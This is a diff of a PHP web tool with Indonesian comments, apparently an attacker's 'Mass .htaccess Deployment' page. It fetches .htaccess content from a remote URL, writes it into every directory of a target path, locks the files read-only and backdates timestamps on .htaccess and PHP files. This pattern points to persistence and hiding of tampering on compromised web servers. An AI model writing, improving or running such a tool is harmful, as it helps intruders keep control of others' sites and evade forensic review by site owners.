@@ -2,10 +2,12 @@
 // Pengaturan untuk menampilkan error dan flushing
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
+// Naikkan batas memori sebagai pengaman, sesuaikan jika perlu
+ini_set('memory_limit', '256M'); 
 ob_implicit_flush(true); // Aktifkan flushing output secara otomatis
 
 // ===================================================================
-// DEFINISI FUNGSI (TETAP SAMA)
+// FUNGSI UTAMA (TETAP SAMA)
 // ===================================================================
 
 function fetchFileFromUrl($url) {
@@ -21,112 +23,68 @@ function fetchFileFromUrl($url) {
     return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
 }
 
-// -- FUNGSI-FUNGSI DI BAWAH INI TELAH DIMODIFIKASI UNTUK LANGSUNG ECHO --
+// ===================================================================
+// FUNGSI BARU YANG ITERATIF DAN HEMAT MEMORI
+// ===================================================================
 
-function setFolders0755($dir) {
-    if (!is_readable($dir)) { return; }
-    $items = @scandir($dir);
-    if ($items === false) { return; }
+function processDirectory($targetPath, $htaccessContent, $timestamp) {
+    try {
+        // Gunakan iterator untuk menjelajahi semua direktori dan subdirektori
+        $directoryIterator = new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS);
+        $iterator = new RecursiveIteratorIterator($directoryIterator, RecursiveIteratorIterator::SELF_FIRST);
 
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') continue;
-        $path = $dir . '/' . $item;
-        if (is_dir($path)) {
-            if (@chmod($path, 0755)) {
-                echo "<div class='success'>✅ Folder chmod 0755: " . htmlspecialchars($path) . "</div>";
-            } else {
-                echo "<div class='error'>❌ Gagal chmod folder: " . htmlspecialchars($path) . "</div>";
-            }
-            setFolders0755($path);
-        }
-    }
-}
+        echo "<div class='info'>--- 🔧 LANGKAH 1: Set Permission & Deploy .htaccess ---</div>";
 
-function setFiles0644($dir) {
-    if (!is_readable($dir)) { return; }
-    $items = @scandir($dir);
-    if ($items === false) { return; }
+        foreach ($iterator as $fileInfo) {
+            $path = $fileInfo->getPathname();
 
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') continue;
-        $path = $dir . '/' . $item;
-        if (is_dir($path)) {
-            setFiles0644($path);
-        } elseif (is_file($path)) {
-            if (@chmod($path, 0644)) {
-                echo "<div class='success'>✅ File chmod 0644: " . htmlspecialchars($path) . "</div>";
-            } else {
-                echo "<div class='error'>❌ Gagal chmod file: " . htmlspecialchars($path) . "</div>";
-            }
-        }
-    }
-}
-
-function unlockHtaccessFiles($dir) {
-    if (!is_readable($dir)) { return; }
-    $items = @scandir($dir);
-    if ($items === false) { return; }
-    
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') continue;
-        $path = $dir . '/' . $item;
-        if (is_dir($path)) {
-            unlockHtaccessFiles($path);
-        } elseif ($item === '.htaccess') {
-            if (@chmod($path, 0644)) {
-                echo "<div class='success'>✅ Unlock .htaccess: " . htmlspecialchars($path) . "</div>";
-            } else {
-                echo "<div class='error'>❌ Gagal unlock .htaccess: " . htmlspecialchars($path) . "</div>";
-            }
-        }
-    }
-}
-
-function deployHtaccess($dir, $content, $timestamp = false) {
-    if (!is_readable($dir)) { return; }
-    $items = @scandir($dir);
-    if ($items === false) { return; }
-
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') continue;
-        $path = $dir . '/' . $item;
-
-        if (is_dir($path)) {
-            $htaccessPath = $path . '/.htaccess';
-            if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
-                @chmod($htaccessPath, 0644);
-            }
-            
-            if (@file_put_contents($htaccessPath, $content) === false) {
-                echo "<div class='error'>❌ Gagal deploy ke: " . htmlspecialchars($htaccessPath) . "</div>";
-            } else {
-                echo "<div class='success'>✅ Deployed .htaccess: " . htmlspecialchars($htaccessPath) . "</div>";
-                if (@chmod($htaccessPath, 0444)) {
-                    echo "<div class='success'>🔒 .htaccess dikunci (0444): " . htmlspecialchars($htaccessPath) . "</div>";
+            if ($fileInfo->isDir()) {
+                // Proses untuk direktori
+                if (@chmod($path, 0755)) {
+                    echo "<div class='success'>✅ Folder chmod 0755: " . htmlspecialchars($path) . "</div>";
                 } else {
-                    echo "<div class='error'>❌ Gagal chmod .htaccess 0444: " . htmlspecialchars($htaccessPath) . "</div>";
+                    echo "<div class='error'>❌ Gagal chmod folder: " . htmlspecialchars($path) . "</div>";
                 }
-                if ($timestamp && @touch($htaccessPath, $timestamp)) {
-                    echo "<div class='success'>⏱️ Timestamp set untuk " . htmlspecialchars($htaccessPath) . "</div>";
-                } elseif ($timestamp) {
-                    echo "<div class='error'>❌ Gagal set timestamp: " . htmlspecialchars($htaccessPath) . "</div>";
+
+                // Deploy .htaccess di dalam direktori ini
+                $htaccessPath = $path . '/.htaccess';
+                if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
+                    @chmod($htaccessPath, 0644); // Coba unlock
                 }
-            }
-            deployHtaccess($path, $content, $timestamp);
-        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php' && $timestamp) {
-            if (@touch($path, $timestamp)) {
-                echo "<div class='success'>⏱️ Timestamp set untuk PHP: " . htmlspecialchars($path) . "</div>";
-            } else {
-                echo "<div class='error'>❌ Gagal set timestamp untuk PHP: " . htmlspecialchars($path) . "</div>";
+                
+                if (@file_put_contents($htaccessPath, $htaccessContent) !== false) {
+                    echo "<div class='success'>✅ Deployed .htaccess: " . htmlspecialchars($htaccessPath) . "</div>";
+                    @chmod($htaccessPath, 0444); // Langsung lock
+                    if ($timestamp) @touch($htaccessPath, $timestamp);
+                } else {
+                    echo "<div class='error'>❌ Gagal deploy ke: " . htmlspecialchars($htaccessPath) . "</div>";
+                }
+
+            } elseif ($fileInfo->isFile()) {
+                // Proses untuk file
+                if ($fileInfo->getFilename() !== '.htaccess') {
+                     if (@chmod($path, 0644)) {
+                        echo "<div class='success'>✅ File chmod 0644: " . htmlspecialchars($path) . "</div>";
+                    } else {
+                        echo "<div class='error'>❌ Gagal chmod file: " . htmlspecialchars($path) . "</div>";
+                    }
+                }
+                
+                // Set timestamp untuk file PHP jika diminta
+                if ($timestamp && $fileInfo->getExtension() === 'php') {
+                    @touch($path, $timestamp);
+                }
             }
         }
+    } catch (Exception $e) {
+        echo "<div class='error'>❌ Terjadi Error Saat Memindai Direktori: " . htmlspecialchars($e->getMessage()) . "</div>";
     }
 }
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🚀 Mass .htaccess Deployment</title>
+    <title>🚀 Mass .htaccess Deployment (Optimized)</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
         input, button { padding: 10px; width: 100%; margin-bottom: 10px; }
@@ -138,9 +96,9 @@ function deployHtaccess($dir, $content, $timestamp = false) {
     </style>
 </head>
 <body>
-    <h2>🚀 Mass .htaccess Deployment</h2>
+    <h2>🚀 Mass .htaccess Deployment (Optimized)</h2>
     
-    <?php if ($_SERVER['REQUEST_METHOD'] !== 'POST'): // Tampilkan form hanya jika bukan POST request ?>
+    <?php if ($_SERVER['REQUEST_METHOD'] !== 'POST'): ?>
     <form method="POST">
         <label>🎯 Target Path:</label>
         <input type="text" name="target_path" placeholder="/var/www/html" required>
@@ -154,9 +112,6 @@ function deployHtaccess($dir, $content, $timestamp = false) {
 
     <div class="log">
         <?php
-        // ===================================================================
-        // LOGIKA UTAMA HANYA BERJALAN SAAT REQUEST ADALAH POST
-        // ===================================================================
         if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             echo "<h3>Proses Dimulai...</h3>";
 
@@ -171,16 +126,8 @@ function deployHtaccess($dir, $content, $timestamp = false) {
                 if (!$htaccessContent) {
                     echo "<div class='error'>❌ Gagal ambil isi .htaccess dari URL.</div>";
                 } else {
-                    echo "<div class='info'>--- 🔧 LANGKAH 1: Set Permission Folder & File ---</div>";
-                    setFolders0755($targetPath);
-                    setFiles0644($targetPath);
-                    
-                    echo "<div class='info'>--- 🔓 LANGKAH 2: UNLOCK .htaccess jika ada ---</div>";
-                    unlockHtaccessFiles($targetPath);
-
-                    echo "<div class='info'>--- 🚀 LANGKAH 3: MASS DEPLOY .htaccess ---</div>";
-                    deployHtaccess($targetPath, $htaccessContent, $timestamp);
-                    
+                    // Panggil fungsi iteratif yang baru
+                    processDirectory($targetPath, $htaccessContent, $timestamp);
                     echo "<h3 style='color:#0f0;'>✅ Proses Selesai.</h3>";
                 }
             }
